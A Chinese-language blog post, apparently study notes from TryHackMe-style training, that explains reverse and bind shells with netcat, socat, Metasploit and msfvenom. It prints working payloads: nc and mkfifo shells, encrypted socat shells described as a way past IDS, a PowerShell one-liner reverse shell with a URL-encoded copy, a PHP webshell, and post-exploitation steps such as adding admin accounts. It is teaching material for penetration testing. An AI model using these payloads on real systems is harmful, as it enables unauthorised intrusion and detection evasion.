---
layout: post
title:  "提权"
tags: [security]
---

* 目录
{:toc}

## Shell

Shell 是用户与操作系统命令行界面（CLI）交互的桥梁。在渗透远程系统时，我们有时可以迫使服务器上运行的应用程序（例如网页服务器）执行任意代码。一旦实现这一点，我们就可以利用这一初始访问权限，在目标设备上获取一个可操控的 Shell，通常有两类方法来建立：

1. reverse shell：反弹shell
2. bind shell：正向shell

### 建立shell的工具

我们可以利用工具来建立shell。

#### netcat

Netcat 是建立 Shell 连接最基础、最通用的工具，虽然默认很简陋且不稳定，但它是所有黑客必须掌握的“入门级”重型武器。

1. 定位：网络界的“瑞士军刀”

多功能性：Netcat 是一个极其强大的底层网络工具，几乎可以处理任何 TCP/UDP 相关的交互。

信息搜集：在扫描阶段，它常用于 Banner Grabbing（指纹识别），通过连接端口获取目标服务返回的欢迎信息（Banner），从而判断软件版本。

2. 核心用途：Shell 的中转站

在获取远程访问权限时，它是连接的“两端”：

接收端：作为监听器，用来接收目标机器传回的 反弹 Shell (Reverse Shell)。

发起端：作为客户端，去连接目标机器上已经开启的 正向 Shell (Bind Shell) 端口。

3. 致命弱点：不稳定性

易丢失：默认状态下的 Netcat Shell 非常脆弱。比如你不小心按了 Ctrl+C、输入了错误的命令，或者网络稍微波动，整个会话就会立即崩溃。

功能受限：它不支持命令补全（Tab 键）、不能使用向上箭头查看历史记录，甚至不支持一些交互式编辑器（如 vim）。

解决预告：虽然默认很“垃圾”，但可以通过特定的技术进行升级（Stabilization），使其变得像真正的终端一样好用。

#### socat

Netcat 像是瑞士军刀：小巧、到处都能找到，虽然功能有限但关键时刻总能顶上。

Socat 像是重型多功能电动工具箱：干活更稳、效率更高，但你得专门去买，而且还得看说明书才会用。

1. 性能：功能更强、更稳定

加强版：Socat 涵盖了 Netcat 的所有功能，并且扩展了更多高级用途。

更稳定：在获取 Shell 时，Socat 提供的连接通常比 Netcat 更加稳定（比如不容易因为误触 Ctrl+C 而断开）。

2. 缺点：门槛更高

尽管 Socat 很强大，但它有两个明显的劣势：

语法复杂：Socat 的命令参数非常多，学习曲线比 Netcat 陡峭。

普及率低：绝大多数 Linux 系统都自带 Netcat，但 Socat 通常需要手动安装。

3. 跨平台支持

Windows 可用：虽然这两个工具源自 Linux，但它们都有对应的 .exe 版本，可以在 Windows 系统上运行。

#### metasploit -- multi/handler

适用于复杂的渗透任务，特别是需要使用 Meterpreter 或自动化后渗透模块时。

1. 它的本质：超级接收器

功能：和 Netcat 或 Socat 一样，它的主要任务是“监听”并接收从目标机器弹回来的连接。

地位：它是 Metasploit 框架处理所有反弹连接的通用接口。

2. 稳定性与功能：更专业、更强大

稳定性：由于背靠 Metasploit 强大的后渗透支持，它获取的 Shell 通常非常稳定，且提供了大量现成的工具来进一步增强和加固这个 Shell。

多样性：它提供了丰富的配置选项，可以根据不同的攻击场景（如绕过防火墙）调整监听参数。

3. Meterpreter 的唯一入口

排他性：如果你使用的攻击载荷是 Meterpreter（那种功能极强、支持内存操作的 Shell），那么 multi/handler 是唯一能与之通信并进行交互的接收端。Netcat 是无法处理 Meterpreter 流量的。

4. 分阶段载荷 (Staged Payloads) 的首选

自动化：在处理“分阶段载荷”（先发一段小程序，再由小程序下载大程序的攻击方式）时，multi/handler 能自动完成后续阶段的传输和对接，这是手动工具（如 Netcat）很难做到的。

#### msfvenom

1. 它的本质：载荷生成工厂

功能：msfvenom 是一个独立运行的命令行工具，专门用于即时生成（Generate on the fly）各种攻击载荷（Payloads）。

地位：虽然它是 Metasploit 框架的一部分，但你可以直接在终端调用它，不需要先进入 msfconsole。

2. 核心用途：定制“子弹”

生成 Shell：它的主要用途是生成反弹 Shell 或 正向 Shell 的代码。

多样性：除了 Shell，它还能生成很多其他类型的攻击载荷（比如专门用于提权或执行特定命令的代码）。

多平台支持：它可以生成针对 Windows (.exe, .msi)、Linux (.elf)、Web (php, asp, jsp) 甚至 Python、Bash 脚本的载荷。

3. 极高的灵活性

参数定制：你可以通过命令参数精确控制载荷的行为，比如设置它弹回哪一个 IP（LHOST）和端口（LPORT），以及是否需要进行混淆以尝试绕过杀毒软件。

#### 其他

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

https://github.com/danielmiessler/SecLists

kali：/usr/share/webshells

### shell类型

1. 反弹 Shell (Reverse Shell) —— “主动求职”模式

原理：目标机器主动连接你的电脑。你在本地开启一个“监听器（Listener）”等待它连接。

优点：非常擅长绕过防火墙。大多数防火墙只严格限制“进”的流量，但对“出”的流量（目标机器主动发起的连接）管束较松。

缺点：如果目标在互联网上，你需要配置自己的网络（如路由器端口转发）来接收这个连接。但在 TryHackMe 这种虚拟专用网环境里，这不算问题。

地位：通常是首选，因为它更易于执行和调试。

2. 正向 Shell (Bind Shell) —— “开门迎客”模式

原理：目标机器在本地开启一个监听端口并绑定一个 Shell。你作为攻击者，主动去连接它的这个端口。

优点：你不需要配置自己的网络。

缺点：极其容易被防火墙拦截。目标服务器的防火墙通常会阻止任何未经过授权的端口尝试从外部进入。

#### reverse shell

在攻击机执行：

```
sudo nc -lvnp <Attacker-PORT>
```

- `-l`：listen监听模式
- `-v`：verbose详细输出
- `-n`：numeric不反查主机名，直接显示ip地址
- `-p`：port

这里用一个知名端口，比如443，更容易绕过目标主机的出站防火墙规则，但是1000以下的端口需要sudo权限。

在靶机执行：

```
nc <Attacker-IP> <Attacker-PORT> -e /bin/bash
```

#### bind shell

在靶机执行：

```
nc -lvnp <port> -e "cmd.exe"
```

在攻击机执行：

```
nc MACHINE_IP <port>
```

#### interactive shell

平时用的 Bash, PowerShell, Zsh 都是交互式的，支持实时问答。当你运行一个需要用户输入信息的程序（如 ssh 询问密码、sudo 询问密码或确认 yes/no）时，它可以正常显示提示文字并等待你输入。

#### non-interactive shell

不支持交互式程序。它只能执行那些“跑完就出结果”的命令（如 whoami, ls, cat）。如果你在非交互式 Shell 里运行 ssh 或 mysql，屏幕可能一片漆黑，或者程序直接卡死。因为它没法把“请输入密码”这句话传给你，你也无法把密码传给它。

绝大多数通过 nc 拿到的初始反弹 Shell 都是非交互式的。

### 稳定的nc shell

通过 nc 获得的 shell 默认稳定性极差。按下 Ctrl + C 就会直接终止整个会话。它属于非交互式 shell，还经常出现奇怪的格式错乱问题。究其原因，nc 所谓的 “shell” 本质只是在终端内运行的进程，并非独立完整的正规终端。好在，在 Linux 系统中有很多种方法可以对 nc shell 进行稳定化处理，本文将介绍其中三种。Windows 反弹 shell 的稳定化操作通常难度要大得多，不过接下来要讲解的第二种方法，对 Windows 反弹 shell 尤为适用。

#### python

第一种方法仅适用于 Linux 设备，因为这类设备几乎默认预装了 Python。该方法分为三个步骤：

1. 首先执行命令 `python -c 'import pty;pty.spawn ("/bin/bash")'`，该命令借助 Python 生成功能更完善的 Bash 终端；需要注意的是，部分目标设备可能需要指定 Python 版本。若遇到这种情况，可根据实际需求将 python 替换为 python2 或 python3。此时我们的终端界面会变得更加规整，但依旧无法使用制表符自动补全和方向键，按下 Ctrl + C 组合键仍会直接终止终端进程。
2. 第二步执行 `export TERM=xterm` 命令 —— 这会让我们可以使用 clear 等终端命令。
3. 最后（也是最重要的一步），我们按下 Ctrl + Z 将该 Shell 置于后台。回到本机终端后，执行命令 `stty raw -echo; fg`。该命令会完成两项操作：首先，关闭本机终端的回显功能（由此我们便可使用 Tab 键自动补全、方向键，以及 Ctrl + C 终止进程）；随后将后台的 Shell 切换至前台，至此整个操作流程完成。

请注意，如果终端会话进程终止，你在自身终端中输入的任何内容都将不可见（原因是已禁用终端回显）。若要解决此问题，盲敲 reset 并按下回车键即可。

#### rlwrap

rlwrap是一个包装器（Wrapper），利用 GNU Readline 库来增强原本简陋的命令行工具（如 nc）。

核心功能：只要在命令前加上它，你就能立刻获得：

1. 命令历史记录（向上箭头查看之前的命令）。
2. Tab 自动补全。
3. 方向键移动光标。

使用方式只需要在你的攻击机上，将普通的监听命令：`nc -lvnp <port>`替换为：`rlwrap nc -lvnp <port>`。

Windows 的反弹 Shell 极难稳定，rlwrap 是目前最简单的增强方案。但这个方案按 Ctrl+C 还是会断开连接。

如果目标系统是Linux，配合`ctrl+z` + `stty raw -echo; fg`即可防止Ctrl+C自杀。

#### socat

先用最简单的工具（Netcat）打进去，然后在对方机器上“下载安装”一个更强大的武器（Socat）。由于 Socat 支持完整的 TTY 模拟，一旦跑起来，你的 Shell 就会像 SSH 一样稳固。这种“质的提升”主要针对 Linux。在 Windows 上，Socat 并不比 Netcat 稳多少。

1. 在攻击机上准备好socat静态编译版（无任何依赖的独立编译程序版本），开启web服务`python3 -m http.server 80`，让靶机可以下载到socat可执行文件。
2. 在靶机下载socat：Linux`wget <IP>/socat -O /tmp/socat`，Windows`Invoke-WebRequest -uri <IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`。
3. 赋予执行权限并运行。

#### 调整窗口尺寸

当你完成了之前的 stty raw -echo 升级后，虽然有了交互能力，但你会发现如果运行 vim、nano 或者 top 这种全屏程序，界面往往是乱的。这是因为远程机器不知道你本地窗口的行数（rows）和列数（columns）。

1. 获取你本地的尺寸，在你自己的电脑（攻击机）上重新开一个终端窗口，运行：`stty -a`，你会看到：rows 45; columns 118;。这代表你当前的终端窗口高度是 45 行，宽度是 118 个字符。

2. 告诉远程机器这个尺寸，回到你那个已经拿到的反弹 Shell 中，根据刚才得到的数字输入：

```
stty rows 45
stty cols 118
```

### socat

Socat 的核心逻辑是：将两个不同的数据流（点）连接在一起。这两个点可以是：

- 一个网络端口和键盘（标准输入）。
- 一个网络端口和一个文件。
- 两个网络端口。
- 一个网络端口和一个可执行程序（如 /bin/bash）。

#### reverse shell

如前所述，socat 的语法比 netcat 复杂得多。以下是 socat 中基础反向 shell 监听端的语法，末尾的 - 符号，代表将接收到的流量与本地标准输入输出相连：

```
socat TCP-L:<port> -
```

在 Windows 系统中，我们将使用以下命令进行反向连接：

```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

“pipes” 选项用于强制 PowerShell（或 cmd.exe）使用 Unix 风格的标准输入和输出。

以下是适用于 Linux 目标机的等效命令：

```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

#### bind shells

靶机上执行：

```
# linux
socat TCP-L:<PORT> EXEC:"bash -li"
# windows
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

攻击机上执行：

```
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

#### 稳定的socat shell

现在我们来了解 Socat 一项功能强大的用法：完全稳定的 Linux 终端反向 Shell。该方式仅在目标设备为 Linux 系统时可用，但稳定性要高出很多。

攻击机开启高级监听：

```
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

它将你的本地终端（tty）直接作为文件传给连接，并设置 echo=0（关闭回显）。这相当于手动一键完成了 stty raw -echo。

靶机反弹并绑定 PTY：

```
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

- pty: 在目标机上分配一个伪终端。
- stderr: 确保错误信息也能通过 Shell 传回（很多反弹 Shell 看不到报错，就是因为没传 stderr）。
- sigint: 转发 Ctrl+C 信号。
- setsid: 在新会话中创建进程。
- sane: 自动调整并保持终端状态“理智”。

如果 Socat 连接不正常，可以加上 `-d -d` 参数（增加冗余度/Verbosity），它会输出详细的调试信息，告诉你到底是在哪一环断开了，这对后端排查网络问题非常有帮助。

#### 加密shell

普通的 nc 或 socat 流量是明文（Cleartext）传输的。这意味着：

1. 会被监控：管理员通过网络嗅探（如 Wireshark）可以直接看到你执行的每一条命令和返回的结果。
2. 会被拦截：入侵检测系统（IDS）如果发现流量中包含 whoami、cat /etc/shadow 等敏感字符，会自动切断连接。

加密的优势：加密流量看起来像普通的随机字符，能有效绕过防火墙和 IDS。

证书生成：

在使用加密 Shell 之前，你需要为你的“服务器”（监听端）准备一份证书。

生成证书私钥，这会生成一个 2048 位的 RSA 私钥和一份有效期近一年的自签名证书：

```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```

合并为pem文件，Socat 要求将密钥和证书合并在一个文件里。

```
cat shell.key shell.crt > shell.pem
```

开启监听，verify=0 表示连接时无需验证我们的证书是否由受信任的权威机构正规签发：

```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```

反向连接：

```
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

对于bind-shell：

```
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```

再次注意，即便是针对 Windows 目标主机，证书也必须与监听器配合使用，因此若要建立绑定型 Shell，必须将 PEM 文件复制到目标主机。

"稳定的socat shell"节里的命令，也可以替换为加密版本。

```
socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0

socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

### 常见shell载荷

之前提到的nc的-e选项，在大部分版本的nc中被认为非常不安全，因此是被禁用的。Windows 下通常可以直接使用二进制文件（支持 -e）；Linux 下则常需借助 mkfifo 绕过限制。

监听，创建一个命名管道 /tmp/f，通过管道将 Netcat 的输出传给 /bin/sh，再将 Shell 的执行结果传回 Netcat，从而形成一个闭环：

```
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

连接，逻辑与正向 Shell 几乎一致，只是将 Netcat 的语法从“监听模式”改为“连接模式”。

```
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

单行powershell反弹shell：

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### msfvenom & multi/handler

https://dew2phan.github.io/2026/05/09/metasploit.html#msfvenom

### webshell

Webshell 是运行在 Web 服务器（如 PHP, ASP）上的脚本，允许攻击者通过网页远程执行系统命令。当无法直接建立正向（Bind）或反向（Reverse）Shell 时，Webshell 是最佳替代方案。它常作为建立更完整 Shell 的“跳板”。通过 HTML 表单或 URL 参数传递命令，结果会直接回显在网页上。

一个简单的php webshell：

```
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

Kali Linux 默认在 /usr/share/webshells 目录下存放了大量现成的 Webshell。需要注意的是，大多数通用型、特定语言（如 PHP）的反弹 Shell 都是为基于 Unix 的目标设备（例如 Linux 网页服务器）编写的，默认情况下无法在 Windows 系统上运行。

当目标系统为 Windows 时，通过网页木马获取远程代码执行权限往往是最简便的方式，也可以利用 msfvenom 工具，以服务器所用语言生成反弹 Shell 或绑定 Shell。采用前一种方式时，通常使用经过 URL 编码的 PowerShell 反弹 Shell 来获取远程代码执行权限。可将其作为 cmd 参数复制到网址中：

```
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

这和前面的单行powershell反弹shell一样，不过它已进行 URL 编码，可在 GET 参数中安全使用。请记住，仍需在上述代码中修改 IP 地址和端口。

### 拿到shell之后

虽然反向 Shell 和正向 Shell 能提供远程代码执行（RCE）权限，但依然不如原生 Shell 好用。

Linux靶机的理想目标是直接获取用户账户的访问权限：

- SSH 密钥：在 /home/<user>/.ssh 目录下寻找私钥。
- 凭据搜寻：在系统中查找遗留的明文密码。
- 直接添加账户：利用漏洞（如 Dirty C0W 脏牛漏洞）或通过提权修改 /etc/shadow 或 /etc/passwd 直接添加自己的账户，然后通过 SSH 登录。

Windows 的方法相对受限，但思路一致：

- 挖掘注册表/文件中的密码：VNC 服务器常在注册表中存储明文密码。FileZilla FTP Server 的配置文件（如 FileZilla Server.xml）中可能存有明文或 MD5 加密的凭据。
- 添加管理员账户（前提是已获得 SYSTEM 或高权限管理员 Shell）：
    - 创建用户：net user <username> <password> /add
    - 提升为管理员：net localgroup administrators <username> /add

在实战中要特别注意，执行 net user /add 这种操作在有安全防护（EDR/杀毒软件）的环境中极其容易被触发告警。在进行这类操作前，通常需要先确认对方是否有监控。